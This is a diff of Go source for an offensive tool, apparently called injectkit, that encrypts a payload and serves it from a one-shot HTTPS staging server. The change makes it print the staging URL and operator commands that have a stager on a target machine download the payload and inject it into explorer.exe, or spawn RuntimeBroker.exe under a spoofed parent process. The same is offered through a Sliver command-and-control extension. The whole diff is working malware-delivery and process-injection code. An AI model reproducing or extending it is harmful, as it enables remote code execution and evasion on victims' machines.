@@ -22,6 +22,7 @@ import (
 	"math/big"
 	"net"
 	"net/http"
+	"net/url"
 	"os"
 	"path/filepath"
 	"sync/atomic"
@@ -102,19 +103,37 @@ func runStage(args []string) {
 	fmt.Printf("[+] payload → %s (%d bytes)\n", payloadPath, len(enc))
 	fmt.Printf("[+] key     → %s\n\n", keyHex)
 
-	fmt.Println("[i] Standalone (injectkit.exe on target):")
-	fmt.Printf("    injectkit.exe -mode stager -url %s -key %s -target explorer.exe\n", *rawURL, keyHex)
-	fmt.Printf("    injectkit.exe -mode stager -url %s -key %s -spawn RuntimeBroker.exe -ppid explorer.exe\n\n", *rawURL, keyHex)
-
-	fmt.Println("[i] Sliver Extension (after: extensions install build/inject-0.1.0.tar.gz):")
-	fmt.Printf("    sliver (TARGET)> inject url=%s key=%s target=explorer.exe\n", *rawURL, keyHex)
-	fmt.Printf("    sliver (TARGET)> inject url=%s key=%s spawn=RuntimeBroker.exe ppid=explorer.exe\n", *rawURL, keyHex)
-
 	if *serve {
-		if err := newPayloadServer(enc, *port).ListenAndServe(); err != nil {
+		srv := newPayloadServer(enc, *port)
+
+		baseURL, err := url.Parse(*rawURL)
+		if err != nil {
+			fmt.Fprintln(os.Stderr, "[-] invalid --url:", err)
+			os.Exit(1)
+		}
+		stagingURL := fmt.Sprintf("%s://%s%s", baseURL.Scheme, baseURL.Host, srv.path)
+
+		fmt.Printf("[*] One-shot HTTPS server on :%d — shuts down after one download\n", *port)
+		fmt.Printf("[+] Staging URL: %s\n", stagingURL)
+		fmt.Printf("    (random path generated automatically — only this URL works)\n\n")
+		fmt.Println("[i] Standalone (injectkit.exe on target):")
+		fmt.Printf("    injectkit.exe -mode stager -url %s -key %s -target explorer.exe\n", stagingURL, keyHex)
+		fmt.Printf("    injectkit.exe -mode stager -url %s -key %s -spawn RuntimeBroker.exe -ppid explorer.exe\n\n", stagingURL, keyHex)
+		fmt.Println("[i] Sliver Extension (after: extensions install build/inject-0.1.0.tar.gz):")
+		fmt.Printf("    sliver (TARGET)> inject url=%s key=%s target=explorer.exe\n", stagingURL, keyHex)
+		fmt.Printf("    sliver (TARGET)> inject url=%s key=%s spawn=RuntimeBroker.exe ppid=explorer.exe\n\n", stagingURL, keyHex)
+
+		if err := srv.ListenAndServe(); err != nil {
 			fmt.Fprintln(os.Stderr, "[-]", err)
 			os.Exit(1)
 		}
+	} else {
+		fmt.Println("[i] Start the staging server when ready:")
+		fmt.Printf("    ./injectkit serve --payload %s\n", payloadPath)
+		fmt.Printf("    (the server will print the exact URL to use)\n\n")
+		fmt.Println("[i] Then use the printed URL in your commands:")
+		fmt.Printf("    injectkit.exe -mode stager -url <URL> -key %s -target explorer.exe\n", keyHex)
+		fmt.Printf("    sliver (TARGET)> inject url=<URL> key=%s target=explorer.exe\n\n", keyHex)
 	}
 }
 
@@ -221,14 +240,6 @@ func (s *payloadServer) ListenAndServe() error {
 	if err != nil {
 		return err
 	}
-
-	addrs, _ := net.InterfaceAddrs()
-	for _, a := range addrs {
-		if ip, ok := a.(*net.IPNet); ok && !ip.IP.IsLoopback() && ip.IP.To4() != nil {
-			fmt.Printf("[+] Payload URL: https://%s:%d%s\n", ip.IP, s.port, s.path)
-		}
-	}
-	fmt.Printf("[*] One-shot HTTPS server on :%d (shuts down after one download)\n", s.port)
 
 	ln, err := net.Listen("tcp", fmt.Sprintf(":%d", s.port))
 	if err != nil {
